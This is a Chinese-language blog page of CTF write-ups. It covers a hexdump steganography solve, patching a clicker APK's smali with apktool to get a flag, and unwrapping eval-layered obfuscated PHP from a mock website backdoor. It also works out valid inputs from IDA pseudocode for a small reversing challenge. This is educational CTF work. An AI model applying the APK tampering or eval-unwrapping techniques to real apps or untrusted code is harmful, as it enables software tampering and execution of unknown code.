+<p><a href="https://github.com/ctfs/write-ups-2015/blob/master/hitcon-ctf-quals-2015/stego/unreadable/unreadable-4b2868cc26a8dad5695e537a9dd8a164" target="_blank" rel="noopener">unreadable-4b2868cc26a8dad5695e537a9dd8a164</a></p>
+</blockquote>
+<h2 id="過程"><a href="#過程" class="headerlink" title="過程"></a>過程</h2><p>拿到一隻 binary file 先用 file, binwalk 檢查，都沒結果。</p>
+<p>直接用 xxd 看，檔案太大不好看，output 輸出成 file 後用 sublime text 一看</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/384384/HhsU0aWqS92g3lGdDr8g_QQ%E6%88%AA%E5%9B%BE20151223190807.png)</figure>
+
+<p>由許多 unprintable 的 char 當作背景拚出了 flag 的樣子</p>
+<figure class="figure-code code"><div class="highlight"><pre>hitcon{WE USE XXD INSTEAD OF IDA PRO}
+</pre></div>
+</figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/12/23/HITCON-2015-unreadable-steg100/" data-id="cjx6w1js10005l6vqwwy4yr5o" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TMCTF-2015-Analysis-Offensive-200" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/12/23/TMCTF-2015-Analysis-Offensive-200/" class="article-date">
+  <time datetime="2015-12-23T11:44:07.000Z" itemprop="datePublished">2015-12-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/12/23/TMCTF-2015-Analysis-Offensive-200/">TMCTF 2015 Analysis-Offensive 200</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Virus-Clicker-apk"><a href="#Virus-Clicker-apk" class="headerlink" title="Virus Clicker.apk"></a>Virus Clicker.apk</h2><p>安裝後打開是點點點遊戲 目標是點 10000000(0x989680) 次</p>
+<p>apktool 解開 翻找一下 0x989680 往上看找到 activity/b.smali 中的 onTouchEvent 直接將數字改成 const 0x989680 過不了</p>
+<p>仔細看一下有些 <strong>magic number</strong>, 其中有個 ScoreBroadcastReceiver 裡面也有出現這些數字</p>
+<p>點的過程中經過這些數字時會 sendBroadcast 到 Receiver, 讓 Receiver 串接 xor key</p>
+<p>同時有看到不同的 component 在串 xor key </p>
+<p>所以讓每次點擊變成踩點 onTouchEvent 改成直接經過這些 <strong>maagic number</strong></p>
+<p>最後是 a/a.smalit 有往 SharedPreferences 寫入實際點擊次數 最後會影響串接的 xor_ky 改成常數(0x989680)即可</p>
+<p>用 apktool 包回 apk, signed 後跑起來，點個五次經歷一下檢查點即可得到 flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/12/23/TMCTF-2015-Analysis-Offensive-200/" data-id="cjx6w1jsj0009l6vqmyh6ylrn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Kiwi-CTF-2015-Gaychal-rev80" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/12/23/Kiwi-CTF-2015-Gaychal-rev80/" class="article-date">
+  <time datetime="2015-12-23T11:37:31.000Z" itemprop="datePublished">2015-12-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/12/23/Kiwi-CTF-2015-Gaychal-rev80/">Kiwi CTF 2015 - Gaychal [rev80]</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><blockquote>
+<p>I found some suspicious PHP code on my website. The code was attached to my theme’s footer file.</p>
+<p>It’s either the DRM of the theme, or a virus; however it’s encoded and I can’t figure it out. Do that for me please :)</p>
+<p><a href="https://raw.githubusercontent.com/ctfs/write-ups-2015/master/hack-dat-kiwi-ctf-2015/reversing/gaychal/gaychal.txt" target="_blank" rel="noopener">Download</a></p>
+</blockquote>
+<p>一支肥大的 php code</p>
+<p>還蠻現實的題目，webshell or backdoor 都會 encode/encrypt 一下，混淆視聽</p>
+<h2 id="過程"><a href="#過程" class="headerlink" title="過程"></a>過程</h2><p>目標是還原原始的 php script ，是以 eval 被跑起來的，那就一層層的剝開吧、</p>
+<p>方法是把 eval 拿掉，印出真正的 code, 但解開第一層後發現裡面是另外一組 eval，想必再更內層也會是這様的模式，不可能手工折。</p>
+<p>於是就將計就計，用 php 寫段 script 把每一層的 eval 都拿掉</p>
+<figure class="figure-code code"><div class="highlight"><pre>$a = '.....';
+while(strpos($a, 'eval') !== false){
+    $a = str_replace("eval", '$a=', $a);
+    eval($a);
+    echo strlen($a).PHP_EOL;
+}
+eval($a);
+</pre></div>
+</figure>
+
+<p>跑到最內層會看到印出</p>
+<figure class="figure-code code"><div class="highlight"><pre>the flag is a8cc6eb651a10688e12779b1558193f8
+</pre></div>
+</figure>
+
+<p>直接送 incorrect, 這是最後一個 eval 出來的結果，印出這行的 code 想必有東西</p>
+<p>把最後的 $a 印出是</p>
+<figure class="figure-code code"><div class="highlight"><pre>echo "the flag is ".md5("5+5=9&lt;-- fix this"),PHP_EOL;
+</pre></div>
+</figure>
+
+<p>fix 一下就跑出 flag 了 </p>
+<figure class="figure-code code"><div class="highlight"><pre>php -r 'echo "the flag is ".md5("5+5=10&lt;-- fix this"),PHP_EOL;'
+</pre></div>
+</figure>
+
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/384209/07ZNEo5fTjiAqtuQvbFd_QQ%E6%88%AA%E5%9B%BE20151223190807.png)</figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/12/23/Kiwi-CTF-2015-Gaychal-rev80/" data-id="cjx6w1js40006l6vqqnszy3ia" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TUM-CTF-Teaser-Reverse-10" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/10/26/TUM-CTF-Teaser-Reverse-10/" class="article-date">
+  <time datetime="2015-10-26T08:53:35.000Z" itemprop="datePublished">2015-10-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/10/26/TUM-CTF-Teaser-Reverse-10/">TUM CTF Teaser Reverse 10</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="不算太難的-Reverse-，比較像考-little-endian"><a href="#不算太難的-Reverse-，比較像考-little-endian" class="headerlink" title="不算太難的 Reverse ，比較像考 little-endian"></a>不算太難的 Reverse ，比較像考 little-endian</h2><h3 id="建立-table"><a href="#建立-table" class="headerlink" title="建立 table"></a>建立 table</h3><p>用 ida 看 發現是用 scanf %llx 讀入 64bit hex 表示的 long long int </p>
+<p>輸入的數值會先被 |= 0x8000000000000000;</p>
+<p>接著往下看是個 16 次的迴圈，是把輸入的數字每四 bits 取出當 index 加上 local 變數的地圵 找出這個位置後以 byte 為單位加一</p>
+<p>把兩個 int64 裡面的 bytes 當 array 用</p>
+<p>看 code 比較實在 XD</p>
+<figure class="figure-code code"><div class="highlight"><pre>__int64 v10; // [sp+10h] [bp-18h]@1
+  __int64 v11; // [sp+18h] [bp-10h]@1
+v10 = 0LL;
+  v11 = 0LL;
+
+<p>v4 = 0;<br>  do<br>  {<br>    v5 = 4 * v4++; //從低位址開始 4bits 4bits 取  其實就是 hex 表示數字的一個字 (0~F)<br>    ++*((_BYTE *)&amp;v10 + ((v3 &amp; (15LL &lt;&lt; v5)) &gt;&gt; v5)); // v10 是 int64 有 8ytes 但 4bits 可以表示到 15 這邊是伏筆<br>  }<br>  while ( v4 != 16 );<br></p></pre></div><p></p>
+</figure>
+
+<h3 id="check-階段"><a href="#check-階段" class="headerlink" title="check 階段"></a>check 階段</h3><p>一樣 16 次的 loop 這次變數(v6)從 0 ~ -15</p>
+<figure class="figure-code code"><div class="highlight"><pre>v6 = 0LL;
+  while ( 1 )
+  {
+    v7 = *((_BYTE *)&amp;v11 + v6 + 7); // +7 常數所以是從 v11 的最後一個 byte 往前看 看到 v10 的最低 byte 為止
+    if ( v7 ) // 若不為零 
+    {
+      if ( v7 != (_BYTE)v6 + 15 || v7 &gt; 8u )
+        break;
+    }
+    --v6;
+    if ( v6 == -15 )
+    {
+      puts(":)");
+      system("cat flag.txt");
+      return 0;
+    }
+  }
+</pre></div>
+</figure>
+
+<p>若 byte 中不為零 會以下圖中數字 check</p>
+<figure>![](http://i.imgur.com/qVekBBT.jpg)</figure>
+
+<p>整理一下 若輸入 0 =&gt; |= 0x8000000000000000 =&gt; 15 次 index offset = 0, 1次 offset 8</p>
+<p>=&gt; v10 的第一的 byte 會變成 15, v11 的第一個 byte = 1</p>
+<p>=&gt; check 時希望 v11 的第一個 byte 要是 8 =&gt; fail</p>
+<p>也就是要湊數字填 table, 為了讓 check 通過必須得數字出現的次數跟數值一樣 ex, 55555, 333, 999999999</p>
+<p>然後要 16 位( 64 bits long long int) 因為數直會先被 |= 0x8000000000000000 也就是有一位被限制要 &gt;= 8</p>
+<p>以上就是全部條件 那就來填填看 0x8888888844443331 =&gt; 通過</p>
+<p>存在多組解 符合以上條件都可以 ex 0x8888888855555333 也行</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/10/26/TUM-CTF-Teaser-Reverse-10/" data-id="cjx6w1js80008l6vqgxsstcpj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/22/Blog-Migrated/">搬家</a>
+          </li>
+        
+          <li>
+            <a href="/2016/07/14/AIS3-2016-pre-exam/">AIS3 2016 pre-exam</a>
+          </li>
+        
+          <li>
+            <a href="/2016/06/12/DEFCON-Qualifier-Reverse-amadhj-by-angr/">DEFCON Qualifier Reverse amadhj by angr</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/27/ADL-CTF-2015-SimpleEcho2/">ADL CTF 2015 - SimpleEcho2</a>
+          </li>
+        
+          <li>
+            <a href="/2016/02/01/CSP-CTF-pwn-40-vecho/">CSP CTF pwn 40 - vecho</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 Wayne Lee<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
